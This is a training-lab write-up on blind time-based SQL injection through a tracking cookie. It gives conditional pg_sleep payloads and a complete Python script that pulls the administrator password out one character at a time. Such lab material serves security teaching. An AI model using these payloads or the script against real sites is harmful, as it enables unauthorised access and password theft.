## Lab 14 - Blind SQL injection with time delays and information retrieval

**SQL Injection at** - TrackingId Cookie  
**End Goal** - Find password for the administrator user.

---
### Analysis:  

- TrackingId=xyz`'` returns *status code 200 OK*  
-> no different response for valid or invalid query  
-> not even throwing error for valid or invalid query  

Tried all of these:
> Oracle -------------> dbms_pipe.receive_message(('a'),10)  
Microsoft ----------> WAITFOR DELAY '0:0:10'  
PostgreSQL -------->	SELECT pg_sleep(10)  
MySQL ------------->	SELECT SLEEP(10)  
  
-> Nothing Worked, Turns out we have to use craft the query using `';`like this  
TrackingId=xyz`';<payload>`  

Now  
- TrackingId=xyz`';SELECT pg_sleep(10)--`  
-> URL encode it first using Ctrl+U  
-> Response was 10 seconds Delayed.  
  
- TrackingId=xyz`';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`  
- TrackingId=xyz`';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--`  
-> Tried for Conditional query, Got Delayed Response.  
-> So now we can give conditions to know if it's true or false based on delyed or not.  
  
- TrackingId=xyz`';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`  
-> Got Delayed Response - so users table exists.  
-> Remember? in this case the `FROM users` executes first and if it exists then it goes to the SELECT query.  
  
- TrackingId=xyz`';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`  
-> Got Delayed Response - so administrator user exists.  

- TrackingId=xyz`';SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`  
-> Got Delayed Response - so password is 20 char long.  
  
- TrackingId=xyz`';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`  
-> we can change the character `'a'` to all the smallcase alpha numeric characters for each 20 positions to get the password.  
-> either by using burp-suite intruder or python script.

The Script:
```py
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(48,123):
            sql_payload = "';SELECT CASE WHEN (username='administrator' AND ascii(SUBSTRING(password,%s,1))='%s') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--" %(i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId': 'Ipc9UeYdiaMACNiV' + sql_payload_encoded, 'session': 'svw7bpKpmS0FJ6DLtAJis5WqyWdDtyO4'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sqli_password(url) 

if __name__ == "__main__":
    main()
```
The Command to Run the Script:
```py
python <script.py> "https://Lab-URL/"
```
-> Got the Password in under 2-3 minutes.

- Login as the administrator user using the password.